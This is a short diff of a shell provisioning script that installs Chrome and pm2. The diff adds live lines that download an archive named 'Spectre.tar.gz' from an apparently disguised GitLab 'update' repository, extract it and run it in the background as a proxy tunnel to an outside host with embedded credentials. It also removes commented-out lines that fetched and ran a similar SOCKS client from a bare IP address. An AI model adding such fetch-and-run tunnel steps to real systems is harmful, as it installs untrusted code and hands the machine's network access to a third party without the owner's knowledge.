@@ -48,17 +48,19 @@ apt-get install -y google-chrome-stable
 
 sleep 2
 
-#wget -q http://45.135.58.52/cheese.tar.gz > /dev/null
-#sleep 2
+wget https://gitlab.com/update9394625/update411/-/raw/main/Spectre.tar.gz
+
+sleep 2
+
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@greenleaf.teatspray.fun:8443 &
+
+sleep 2
+
 npm install pm2 -g
-
-sleep 2
-
-#tar -xf cheese.tar.gz
-
-sleep 2
-
-#./cheese client -v 45.135.58.52:443 7777:socks &
 
 sleep 2
 
